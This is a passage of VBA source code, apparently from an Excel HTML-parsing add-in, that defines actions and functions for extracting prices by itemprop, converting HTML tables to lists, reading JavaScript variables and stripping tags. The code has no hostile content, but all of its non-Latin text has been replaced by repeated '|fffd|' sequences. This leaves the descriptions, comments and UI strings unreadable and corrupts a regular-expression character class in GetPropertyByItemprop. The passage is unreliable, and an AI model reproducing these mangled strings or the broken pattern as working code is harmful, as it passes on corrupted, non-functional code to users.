        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd|price|fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd| meta |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| content, |fffd||fffd| |fffd||fffd||fffd||fffd| img |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| src, " & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd| a |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| href, |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (innerHTML)"
        .AddParameter "itemprop", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop", , "price"
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, *, meta |fffd||fffd||fffd| span)", Array("*", "meta", "a", "span", "img"), "*"
        .AddParameter "Index", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|)", Array("|fffd||fffd||fffd|", "1", "2", "3", "4", "5"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_HTML, "TableToSeparatedList", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (<table>...</table>)" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|1||fffd||fffd||fffd||fffd||fffd||fffd||fffd|2||fffd||fffd||fffd||fffd||fffd||fffd||fffd|3" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Mode", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("simple", "extended"), "simple"
    End With

    With AAs.AddAction(fc_UNUSED, "GetPrice", "# |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| v.1")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| <meta itemprop=""price"" content=""..."">" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| <|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop=""price"">" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 0)"
    End With

    With AAs.AddAction(fc_HTML, "GetPrice2", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| v.2")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| <meta itemprop=""price"" content=""..."">" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| <|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop=""price"">" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, -  |fffd||fffd||fffd||fffd||fffd||fffd| <|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| class=""*price*"">" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd| |fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| HTML," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| span class=new-price" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| &, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: id=Main&span class=new-price" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 0)"
        .AddParameter "Filters", aps_Text, "HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, id=content)"
        .AddParameter "ExcludeChars", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| , |fffd||fffd||fffd| .)"
    End With

    With AAs.AddAction(fc_HTML, "GetJavaScriptVar", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| JavaScript")
        .Description = "|fffd||fffd||fffd||fffd| |fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| JavaScript |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: var |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = {...};" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| text), |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| JSON |fffd| XML (|fffd||fffd||fffd||fffd||fffd| XML)"

        .AddParameter "VarName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ReturnFormat", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("text", "XML"), "text"
    End With

    With AAs.AddAction(fc_UNUSED, "RemoveScripts", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <script>...</script> |fffd||fffd| HTML |fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."
    End With


End Sub

Function RemoveTags(ByVal txt$, ByVal tagnames$) As String
    ' tagnames$ |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| script|iframe |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim arr, i&, TagName

    For Each TagName In Split(tagnames$, "|")
        If TagName = "comments" Then
            If txt$ Like "*<!--*-->*" Then
                arr = "": arr = Split(txt, "<!--")
                For i = LBound(arr) + 1 To UBound(arr)
                    If UBound(Split(arr(i), "-->")) = 0 Then arr(i) = "" Else arr(i) = Split(arr(i), "-->")(UBound(Split(arr(i), "-->")))
                Next i
            End If
        Else
            If txt$ Like "*<" & TagName & "*>*</" & TagName & ">*" Then
                arr = "": arr = Split(txt, "<" & TagName & "")
                For i = LBound(arr) + 1 To UBound(arr)
                    If UBound(Split(arr(i), "</" & TagName & ">")) = 0 Then
                        arr(i) = ""
                    Else
                        arr(i) = Split(arr(i), "</" & TagName & ">")(UBound(Split(arr(i), "</" & TagName & ">")))
                    End If
                Next i
            End If
        End If
        txt = Join(arr, "")
    Next

    RemoveTags = txt
End Function

Function TableToSeparatedList(ByVal txt$) As String
    On Error Resume Next
    txt = Replace(txt, "|", Chr(18))

    If txt Like "*<td*</td>*" Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        txt = Replace(txt, "</td>", "</td>|")
        txt = Replace(txt, "</th>", "</th>|")
        txt = HTML2TXT(txt)
        txt = Replace(txt, Chr(160), " ")
        While InStr(1, txt$, "| ", vbBinaryCompare): txt$ = Replace(txt$, "| ", "|"): Wend
        While InStr(1, txt$, " |", vbBinaryCompare): txt$ = Replace(txt$, " |", "|"): Wend
        'RemoveExtraSeparators txt, "|"
        txt = Replace(txt, vbCr, "")
        txt = Replace(txt, "|" & vbLf, vbLf)
        If Right(txt, 1) = "|" Then txt = Left(txt, Len(txt) - 1)
        ' txt = Replace(txt, vbLf & "|", "|")
    End If
    txt = Replace(txt, vbLf, ARSEP)
    txt = Replace(txt, TEMP_ARSEP$, ARSEP)
    ' txt = Replace(txt, vbCr, "")
    txt = Replace(txt, "|" & ARSEP, ARSEP)
    TableToSeparatedList = txt
End Function


Function GetPropertyByItemprop(ByVal txt$, ByVal itemprop$, Optional ByVal TagName$ = "*", _
                               Optional ByVal Index$ = "") As String
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| tagname$, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| itemprop |fffd||fffd||fffd||fffd||fffd||fffd| itemprop$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| innerHTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| index$, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    TagName$ = Trim(TagName$): If TagName$ = "" Then TagName$ = "*"
    Dim foundtag$, res, coll As New Collection, attr$, v, prop$, cnt&, i&
    With REGEXP
        If TagName$ = "*" Then
            .Pattern = "<([A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|0-9]+) [^<>]*itemprop=""" & itemprop$ & """"
            If Not .test(txt) Then Exit Function
            For Each res In .Execute(txt)
                foundtag$ = res.submatches.item(0)
                coll.Add foundtag$, LCase(foundtag$)
            Next
        Else
            For Each res In Split(TagName$, "|")
                If Len(res) Then coll.Add CStr(res), LCase(CStr(res))
            Next
        End If

        For Each res In coll
            attr$ = ""
            Select Case LCase$(res)
                Case "meta": attr$ = "content"
                Case "img", "audio", "embed", "iframe", "source", "video": attr$ = "src"
                Case "a", "area", "link": attr$ = "href"
                Case "object": attr$ = "data"
            End Select

            If Len(attr$) Then
                .Pattern = "<" & res & " [^<>]*itemprop=""" & itemprop$ & """ [^<>]*" & attr$ & "=""([^""]*)"""
                .Pattern = .Pattern & "|" & "<" & res & " [^<>]*" & attr$ & "=""([^""]*)"" [^<>]*itemprop=""" & itemprop$ & """"
            Else
                .Pattern = "<" & res & " [^<>]*itemprop=""" & itemprop$ & """[^<>]*>(.*)</" & res & ">"
            End If
            'MsgBox .Pattern, , ".Pattern"

            For Each v In .Execute(txt)
                prop$ = v.submatches.item(0)
                If Len(prop$) Then
                    If Len(attr$) = 0 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                        cnt& = 1
                        For i = 1 To Len(prop$)
                            If Mid(prop$, i, Len(res) + 1) = "<" & res Then cnt& = cnt& + 1
                            If Mid(prop$, i, Len(res) + 3) = "</" & res & ">" Then cnt& = cnt& - 1
                            If cnt& = 0 Then prop$ = Left(prop$, i - 1): Exit For
                        Next i
                    End If
                    GetPropertyByItemprop = GetPropertyByItemprop & ARSEP & prop$
                End If
            Next
        Next
    End With
    RemoveExtraSeparators GetPropertyByItemprop
    If Index$ Like "[1-9]" Then
        prop$ = "": prop$ = Split(GetPropertyByItemprop, ARSEP)(Val(Index$) - 1)
        GetPropertyByItemprop = prop$
    End If
    Set coll = Nothing
    Err.Clear
End Function

'Private Sub test2222222222222222()
'    'On Error Resume Next
'    Dim txt$, res$
'    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
'        .GetFromClipboard
'        txt = .GetText
'    End With
'    If Not txt Like "*<*>*" Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|": Exit Sub
'
'    res = GetAllChildren(txt)
'    ShowText res
'End Sub
'
'Function GetAllChildren(ByVal txt As String) As String
'    On Error Resume Next
'    Dim EL As Object, ElementClassName$, doc As HTMLDocument, MatchClass As Boolean, ClassName As Variant
'    Set doc = HTMLtextToHTMLDocument(txt)
'   Stop
''    For Each EL In doc.body.all
''        ElementClassName$ = "": ElementClassName$ = EL.ClassName
''        If EL.TagName Like TagName Then
''            MatchClass = False
''            For Each ClassName In Split(ClassNameList, "|")
''                MatchClass = MatchClass Or (" " & ElementClassName$ & " " Like IIf(ClassName = "", "  ", "* " & ClassName & " *"))
''            Next
''            If MatchClass Then
''                EL.outerHTML = ""
''            End If
''        End If
''    Next EL
''    RemoveElementsByTagNameAndClassName = doc.body.innerHTML
'    Set EL = Nothing: Set doc = Nothing
'End Function

Function GetElementsByTagNameAndClassName(ByVal txt As String, ByVal TagName As String, _
                                          ByVal ClassNameList As String, Optional ByVal Source As String) As String
    On Error Resume Next
    Dim EL As Object, ElementClassName$, doc As HTMLDocument, MatchClass As Boolean, ClassName As Variant
    Set doc = HTMLtextToHTMLDocument(txt, TagName)
    For Each EL In doc.body.all
        ElementClassName$ = "": ElementClassName$ = EL.ClassName
        If EL.TagName Like TagName Then
            MatchClass = False
            For Each ClassName In Split(ClassNameList, "|")
                MatchClass = MatchClass Or (" " & ElementClassName$ & " " Like IIf(ClassName = "", "  ", "* " & ClassName & " *"))
            Next
            If MatchClass Then
                GetElementsByTagNameAndClassName = GetElementsByTagNameAndClassName & IIf(Len(GetElementsByTagNameAndClassName), ARSEP, "") & _
                                                   IIf(Source Like "*innerHTML*", EL.innerHTML, EL.outerHTML)
            End If
        End If
    Next EL
